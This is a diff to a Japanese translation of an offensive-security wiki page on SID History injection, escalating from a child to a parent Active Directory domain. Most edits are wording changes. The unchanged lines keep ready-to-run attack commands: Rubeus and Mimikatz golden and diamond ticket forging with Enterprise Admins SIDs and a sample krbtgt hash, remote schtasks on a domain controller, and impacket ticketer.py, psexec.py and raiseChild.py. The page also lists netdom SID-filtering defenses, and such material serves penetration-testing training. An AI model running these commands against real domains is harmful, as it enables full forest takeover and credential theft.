@@ -4,27 +4,27 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**の目的は、**ユーザーのドメイン間移行**を支援し、以前のドメインのリソースへのアクセスを継続できるようにすることです。これは、ユーザーの以前のSecurity Identifier (SID)を新しいアカウントのSID Historyに**組み込む**ことで実現されます。特に、このプロセスを悪用して、親ドメインの高権限グループ（Enterprise AdminsやDomain Adminsなど）のSIDをSID Historyに追加し、不正なアクセスを許可できます。この悪用により、親ドメイン内のすべてのリソースへのアクセス権が与えられます。<sup>[[1]](#references)[[2]](#references)</sup>
+**SID History Injection Attack** の目的は、**user migration between domains** を支援し、以前の domain の resource への継続的な access を確保することです。これは、user の以前の Security Identifier (SID) を新しい account の SID History に**組み込む**ことで実現されます。特に、この process は、parent domain の高権限 group（Enterprise Admins や Domain Admins など）の SID を SID History に追加することで、不正な access を許可するように悪用できます。この exploit により、parent domain 内のすべての resource への access が与えられます。<sup>[[1]](#references)[[2]](#references)</sup>
 
-この攻撃を実行する方法は、**Golden Ticket**または**Diamond Ticket**の作成による2つです。
+この attack を実行する方法は、**Golden Ticket** または **Diamond Ticket** の作成による 2 つです。
 
-**"Enterprise Admins"**グループのSIDを特定するには、まずルートドメインのSIDを確認する必要があります。特定した後、ルートドメインのSIDに`-519`を追加することで、Enterprise AdminsグループのSIDを構成できます。たとえば、ルートドメインのSIDが`S-1-5-21-280534878-1496970234-700767426`の場合、"Enterprise Admins"グループのSIDは`S-1-5-21-280534878-1496970234-700767426-519`になります。<sup>[[1]](#references)</sup>
+**"Enterprise Admins"** group の SID を特定するには、まず root domain の SID を特定する必要があります。特定後、root domain の SID に `-519` を追加することで、Enterprise Admins group の SID を構成できます。たとえば、root domain の SID が `S-1-5-21-280534878-1496970234-700767426` の場合、"Enterprise Admins" group の SID は `S-1-5-21-280534878-1496970234-700767426-519` になります。<sup>[[1]](#references)</sup>
 
-**Domain Admins**グループを使用することもできます。このSIDの末尾は**512**です。
+**Domain Admins** groups を使用することもできます。この SID は **512** で終わります。
 
-別のドメインのグループ（たとえば"Domain Admins"）のSIDを見つける方法は、次のとおりです。
+別の domain にある group（たとえば "Domain Admins"）の SID を見つける別の方法は、次のとおりです。
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> trust relationship で SID history を無効化でき、その場合この攻撃は失敗することに注意してください。
+> trust relationship では SID history を無効化でき、その場合この攻撃は失敗します。
 
-[**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup> によると:
-- netdom tool を使用して **forest trusts で SIDHistory を無効化する**（ドメインコントローラー上で `netdom trust /domain: /EnableSIDHistory:no`）
-- netdom tool を使用して **external trusts に SID Filter Quarantining を適用する**（ドメインコントローラー上で `netdom trust /domain: /quarantine:yes`）
-- **単一の forest 内の domain trusts に SID Filtering を適用することは推奨されません**。これはサポート対象外の構成であり、重大な変更を引き起こす可能性があります。forest 内の domain が信頼できない場合、その domain は forest のメンバーであるべきではありません。この場合、まず信頼された domain と信頼されていない domain を別々の forest に分割し、interforest trust に SID Filtering を適用する必要があります。
+[**docs**](https://technet.microsoft.com/library/cc835085.aspx) によると:<sup>[[3]](#references)</sup>
+- netdom tool を使用して **forest trusts の SIDHistory を無効化**する（ドメインコントローラー上で `netdom trust /domain: /EnableSIDHistory:no` を実行）
+- netdom tool を使用して **external trusts に SID Filter Quarantining を適用**する（ドメインコントローラー上で `netdom trust /domain: /quarantine:yes` を実行）
+- **単一の forest 内の domain trusts に SID Filtering を適用**することは、サポート対象外の構成であり、重大な変更を引き起こす可能性があるため推奨されません。forest 内の domain が信頼できない場合、その domain は forest のメンバーであるべきではありません。この場合、まず信頼された domain と信頼されていない domain を別々の forest に分割し、interforest trust に SID Filtering を適用する必要があります。
 
-これを bypass する方法の詳細については、こちらの post を確認してください: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+これを bypass する方法については、こちらの post を確認してください: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### KRBTGT-AES256 を使った Golden Ticket (Mimikatz)
+### KRBTGT-AES256を使用したGolden Ticket（Mimikatz）
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-侵害されたドメインの KRBTGT hash を使用して、root または Enterprise admin の DA に権限昇格する：
+侵害されたドメインの KRBTGT hash を使用して、root の DA または Enterprise admin へ privilege escalation：
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-攻撃によって取得した権限を使用すると、新しいドメインで、例えば DCSync attack を実行できます。
+攻撃で取得した権限を使用すると、新しいドメインで、例えば DCSync attack を実行できます:
 
 
 {{#ref}}
@@ -101,7 +101,7 @@ dcsync.md
 
 ### Linuxから
 
-#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) を使用した手動実行
+#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)を使用した手動実行
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -121,28 +121,29 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) を使用した自動化
+#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)を使用した自動化
 
-これは **child domain から parent domain への privilege escalation を自動化する** Impacket script です。script には以下が必要です。
+これは、**child domainからparent domainへの権限昇格を自動化する**Impacketのscriptです。scriptには以下が必要です。
 
 - Target domain controller
-- child domain の admin user の creds
+- child domainのadmin userのCreds
 
 フローは以下のとおりです。
 
-- parent domain の Enterprise Admins group の SID を取得
-- child domain の KRBTGT account の hash を取得
-- Golden Ticket を作成
-- parent domain にログイン
-- parent domain の Administrator account の credentials を取得
-- `target-exec` switch が指定されている場合、Psexec を介して parent domain の Domain Controller に authenticate‑nします。
+- parent domainのEnterprise Admins groupのSIDを取得
+- child domainのKRBTGT accountのhashを取得
+- Golden Ticketを作成
+- parent domainにログイン
+- parent domainのAdministrator accountのcredentialsを取得
+- `target-exec` switchが指定されている場合、Psexec経由でparent domainのDomain Controllerに対して認証する。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## 参照
+## 参考文献
 
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [Security Identifier (SID)とは？ - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Trustに関するセキュリティ上の考慮事項 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [2] [Security Identifier (SID) とは？ - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Trust に関するセキュリティ上の考慮事項 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - ドメイン間のセキュリティ境界としての SID Filter Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
